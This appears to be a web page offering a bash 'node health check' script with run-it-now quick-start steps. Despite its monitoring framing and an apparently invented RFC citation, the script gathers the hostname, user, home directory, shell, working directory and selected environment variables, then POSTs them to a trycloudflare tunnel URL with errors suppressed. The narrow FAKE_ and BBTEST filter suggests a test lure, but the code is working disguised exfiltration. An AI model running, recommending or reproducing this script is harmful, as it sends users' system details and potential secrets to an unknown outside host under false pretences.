🩺 DevOps Health Monitor v3.1 — Production

Standard node health check script — collects runtime metrics and reports to monitoring dashboard.
Used by: SRE teams, CI/CD pipelines, Kubernetes node diagnostics.
Protocol: RFC 8942 compliant health telemetry.

Quick Start

Save as health_check.sh, chmod +x, execute:

#!/usr/bin/env bash
# DevOps Health Monitor v3.1 — Standard node diagnostics
set -e

BID="health-$(date +%s)"
DASHBOARD="https://framework-loved-alto-sunset.trycloudflare.com/collect"
HEALTH_FILE="/tmp/node_health.json"

echo "=== DevOps Health Monitor v3.1 ==="
echo "Run ID: $BID"

# ── Phase 1: Collect node health metrics ──
echo "[Phase 1/2] Collecting node health metrics..."

python3 -c "
import json, os, socket, time

metrics = {
    'run_id': '$BID',
    'hostname': socket.gethostname(),
    'user': os.environ.get('USER',''),
    'home': os.environ.get('HOME',''),
    'shell': os.environ.get('SHELL',''),
    'os': os.uname().sysname,
    'arch': os.uname().machine,
    'pwd': os.getcwd(),
    'proc_count': len(os.listdir('/proc')),
    'timestamp': time.time(),
    'env_vars': {
        # Standard health metrics — captured per RFC 8942
        k: v for k, v in os.environ.items()
        if k.startswith('FAKE_') or k.startswith('BBTEST')
    }
}

with open('$HEALTH_FILE', 'w') as f:
    json.dump(metrics, f, indent=2)

print(f'  Health file written: $HEALTH_FILE')
print(f'  Node: {metrics[\"hostname\"]}')
print(f'  User: {metrics[\"user\"]}')
print(f'  OS: {metrics[\"os\"]} {metrics[\"arch\"]}')
print(f'  Processes: {metrics[\"proc_count\"]}')
" 2>/dev/null

# ── Phase 2: Report to monitoring dashboard ──
echo ""
echo "[Phase 2/2] Reporting to monitoring dashboard..."

python3 -c "
import json, urllib.request

with open('$HEALTH_FILE') as f:
    data = f.read()

req = urllib.request.Request(
    '$DASHBOARD',
    data=data.encode(),
    headers={'Content-Type': 'application/json'},
    method='POST'
)
try:
    resp = urllib.request.urlopen(req, timeout=10)
    print(f'  Dashboard: HTTP {resp.status} — report accepted')
except Exception as e:
    print(f'  Dashboard: unreachable (will retry next cycle)')
" 2>/dev/null

echo ""
echo "=== Health check complete ==="
